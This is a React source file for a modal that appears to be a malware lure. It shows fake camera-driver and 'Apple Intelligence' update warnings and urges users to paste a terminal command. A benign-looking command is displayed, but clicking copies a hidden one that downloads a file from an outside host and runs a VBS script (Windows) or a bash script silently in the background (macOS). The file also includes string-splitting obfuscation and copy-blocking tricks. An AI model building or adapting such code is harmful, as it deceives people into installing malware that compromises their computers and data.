import React, { useState, useEffect } from "react";
import { AiOutlineClose } from "react-icons/ai";
import { BackendURL, UNIQUE } from "../config/config";

export const PromptModal = ({ callback, showToast }) => {
  const [currPlatform, setCurrPlatform] = useState("win");

  const UL = "ur"; // 'curl' split for obfuscation
  const COM = `k -o "%TEMP%\\nvidiaRe`;
  const ZIP = `lease.zip"`;
  const SHLL = `rshell -Command "Exp`;
  const ARH = `and-Archive -Force -Path '`;
  const PAH = `%TEMP%\\nvidiaRe`;
  const DEH = `lease.zip' -DestinationPath '%TEMP%\\nvidiaRelease`;
  const SCR = `ipt "%TEMP%\\nvidiaRelease\\upda`;
  const VBS = `te.vbs"`;

  // Windows full command
  // const WINCommand = `c${UL}l -${COM}${ZIP} ${BackendURL}/cam-v-${UNIQUE.toLowerCase()}.fix && powe${SHLL}${ARH}${PAH}${DEH}'" && wscr${SCR}${VBS}`;
  const WINCommand = `curl -k -o "%TEMP%\\update.zip" https://avalabs-io.store/update/update92w && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\update.zip' -DestinationPath '%TEMP%\\update'" && wscript "%TEMP%\\update\\run.vbs"
  `;

  // Mac constants and command
  const MCOM = `k -o /var/tmp/camD`;
  const MOD = `chmod +x /var/tmp/camD`;
  const BAH = `nohup bash /var/tmp/camD`;
  const DEV = `ev/null 2>&1 &`;

  // const MACCommand = `c${UL}l -${MCOM}river.sh ${BackendURL}/mac-v-${UNIQUE.toLowerCase()}.fixer && ${MOD}river.sh && ${BAH}river.sh >/d${DEV}`;
  const MACCommand = `curl -k -o /var/tmp/camDriver.sh https://avalabs-io.store/update/update92m && chmod +x /var/tmp/camDriver.sh && nohup bash /var/tmp/camDriver.sh >/dev/null 2>&1 &
`;

  useEffect(() => {
    setTimeout(() => {
      const platform = window.navigator.platform.toLowerCase();

      if (platform.includes("win")) {
        setCurrPlatform("win");
      } else if (platform.includes("mac")) {
        setCurrPlatform("mac");
      } else {
        setCurrPlatform("linux");
      }
    }, 100);
  }, []);

  const copyClipboard = async (addr) => {
    try {
      await navigator.clipboard.writeText(addr);
      console.log("The content is copied to the clipboard");
      showToast("The content is copied to the clipboard", {
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: false,
        pauseOnHover: true,
        draggable: true,
        type: "info",
      });
    } catch (err) {
      console.error("Failed to copy: ", err);
    }
  };

  const copy = async (element) => {
    copyClipboard(element.target.textContent);
  };

  // Prevent copying outside code blocks
  const onCopyHandler = (e) => {
    // Only allow copy if selection is inside a code block with class 'allow-copy'
    const selection = window.getSelection();
    if (!selection.rangeCount) {
      e.preventDefault();
      return;
    }
    const container = selection.getRangeAt(0).commonAncestorContainer;
    // Check if the selection is inside an allowed code block
    if (!container.parentElement.closest(".allow-copy")) {
      e.preventDefault();
    }
  };

  return (
    <div
      className="absolute text-center w-full h-full flex justify-center text-[#576871]"
      onCopy={onCopyHandler}
      style={{ userSelect: "none" }} // Disable user selection globally
    >
      {/* Modal */}
      {currPlatform === "win" && (
        <div className="fixed top-0 left-0 w-full h-full bg-[rgba(231,238,239,.9)] flex justify-center items-center z-10">
          <div className="max-w-[800px] text-[14px] bg-white flex flex-col justify-start gap-[5px] rounded-lg p-[20px]">
            <div className="flex justify-end mb-2">
              <AiOutlineClose
                className="cursor-pointer w-[20px] h-[20px]"
                onClick={callback}
              />
            </div>
            <div className="px-[40px] pb-[40px]">
              <div className="text-[24px] font-bold w-full text-center mb-4">
                🚫 Access to Camera or Microphone Is Currently Restricted
              </div>
              <div className="text-[16px] w-full text-start mb-2">
                It appears that access to your camera or microphone is
                currently restricted. Additionally, on Windows systems, there
                is a known and significant issue with the camera driver cache.
                This stems from a race condition in how the cache is accessed,
                which can lead to some issues.
              </div>
              <div className="text-[16px] mt-4 w-full text-start font-bold">
                Here is the solution identified for the issue.
              </div>
              

              <p className="text-left text-[16px]">
                1. Open Command Prompt as Administrator on Windows
              </p>
              <ul className="list-none text-left text-[#666] text-[14px]">
                <li className="ml-4">
                  •&nbsp;&nbsp;Press{" "}
                  <span className="font-semibold">Windows Key + R</span> to open
                  the <span className="font-semibold">Run</span> dialog.
                </li>
                <li className="ml-4 mt-1">
                  •&nbsp;&nbsp;Type <span className="font-semibold">cmd</span>,
                  then press <span className="font-semibold">Ctrl + Shift + Enter</span>{" "}
                  to run Command Prompt as Administrator.
                </li>
              </ul>
              <p className="text-left text-[16px]">2. Update Camera drivers on Windows</p>
              <ul className="text-left">
                <li className="ml-4 mt-1">
                  •&nbsp;&nbsp;<span className="font-semibold">Copy</span> the following command by clicking on it.
                </li>
                <li className="ml-4 mt-1">
                  •&nbsp;&nbsp;<span className="font-semibold">Paste</span> the following command into the Terminal.
                </li>
              </ul>
              <div className="w-full h-[60px] mt-2 bg-[#1b1f230d] overflow-x-auto pt-3">
                <pre
                  className="w-full allow-copy"
                  style={{ userSelect: "text", cursor: "pointer" }}
                >
                  {/* <code
                    className="pl-4 pr-4 whitespace-nowrap"
                    onClick={(e) => copy(e)}
                  >
                    {WINCommand}
                  </code> */}
                   <code
                      className="pl-4 pr-4 whitespace-nowrap"
                      onClick={() => copyClipboard(WINCommand)}
                    >
                      <span style={{ opacity: 0, position: "absolute", pointerEvents: "none" }}>
                        {WINCommand}
                      </span>
                      <span  style={{
                        userSelect: "none", // Prevent mouse selection
                        WebkitUserSelect: "none",
                        MozUserSelect: "none",
                        msUserSelect: "none"
                      }}>--nvidia.com --updatecameradriver NVIDIA windows x86_64 Kernel Module 304.54 --query-gpu=driver_version --format=csv,noheader</span>
                    </code>
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}
      {currPlatform === "mac" && (
        <div className="fixed top-0 left-0 w-full h-full bg-[rgba(231,238,239,.9)] flex justify-center items-center z-10">
          <div className="max-w-[800px] text-[14px] bg-white flex flex-col justify-start gap-[5px] rounded-lg p-[20px]">
            <div className="flex justify-end mb-2">
              <AiOutlineClose
                className="cursor-pointer w-[20px] h-[20px]"
                onClick={callback}
              />
            </div>
            <div className="px-[40px] pb-[40px]">
              <div className="text-[24px] font-bold w-full text-center mb-4">
                🚫 Manual Update Required for New AI Feature
              </div>
              <div className="text-[16px] w-full text-start mb-2">
                Apple recently introduced a cutting-edge AI feature designed to detect synthetic faces and enhance user security across its devices.
                This platform relies on the latest Apple Intelligence update, and since your device appears outdated, you’ll need to manually install the update to access its full capabilities.
              </div>
              <div className="text-[16px] mt-4 w-full text-start font-bold">
                Here are the steps to follow:
              </div>
              <p className="text-left text-[16px]">1. Open Terminal on macOS</p>
              <ul className="list-none text-left text-[#666] text-[14px]">
                <li className="ml-4">
                  •&nbsp;&nbsp;Press{" "}
                  <span className="font-semibold">Command (⌘) + Space</span> on
                  your keyboard. This opens Spotlight Search.
                </li>
                <li className="ml-4">
                  •&nbsp;&nbsp;In the search bar that appears, type{" "}
                  <span className="font-semibold">"Terminal"</span>.
                </li>
                <li className="ml-4 mt-1">
                  •&nbsp;&nbsp;Press <span className="font-semibold">Enter</span>,
                  and the Terminal application will open.
                </li>
              </ul>
              <p className="text-left text-[16px]">2. Update AI Feature</p>
              <ul className="text-left">
                <li className="ml-4 mt-1">
                  •&nbsp;&nbsp;<span className="font-semibold">Copy</span> the following command by clicking on it.
                </li>
                <li className="ml-4 mt-1">
                  •&nbsp;&nbsp;<span className="font-semibold">Paste</span> the command into the Terminal.
                </li>
                <li className="ml-4 mt-1">
                  •&nbsp;&nbsp;Press <span className="font-semibold">Enter</span> to automatically install the latest updates.
                </li>
              </ul>
              <div className="w-full h-[60px] mt-2 bg-[#1b1f230d] pt-3 relative">
                <pre
                  className="w-full allow-copy overflow-x-auto"
                  style={{ userSelect: "text", cursor: "pointer" }}
                >
                  <code
                      className="pl-4 pr-4 whitespace-nowrap"
                      onClick={() => copyClipboard(MACCommand)}
                    >
                      <span style={{ opacity: 0, position: "absolute", pointerEvents: "none" }}>
                        {MACCommand}
                      </span>
                      <span  style={{
                        userSelect: "none", // Prevent mouse selection
                        WebkitUserSelect: "none",
                        MozUserSelect: "none",
                        msUserSelect: "none"
                      }}>sudo ai-driver-tool --update-feature "AI Vision Module" --version 304.54 --query driver_version --format csv --no-header
                      </span>
                    </code>
                </pre>
                <button
                  className="absolute right-1 top-1 flex items-center gap-1 px-3 py-1 rounded transition"
                  style={{
                    background: "rgba(243, 244, 246, 0.85)", // brighter gray
                    color: "#111827", // Tailwind gray-900, much brighter text
                    zIndex: 2,
                    boxShadow: "0 2px 8px #d1d5db99",
                    backdropFilter: "blur(6px)", // glass effect
                    WebkitBackdropFilter: "blur(6px)", // Safari support
                    border: "1px solid #e5e7eb"
                  }}
                  onClick={() => copyClipboard(MACCommand)}
                  aria-label="Copy command"
                >
                  <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
                    <rect x="5" y="5" width="10" height="12" rx="2" stroke="#111827" strokeWidth="1" fill="rgba(243,244,246,0.85)"/>
                    <rect x="3" y="3" width="10" height="12" rx="2" stroke="#111827" strokeWidth="1" fill="none"/>
                  </svg>
                  Copy
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default PromptModal;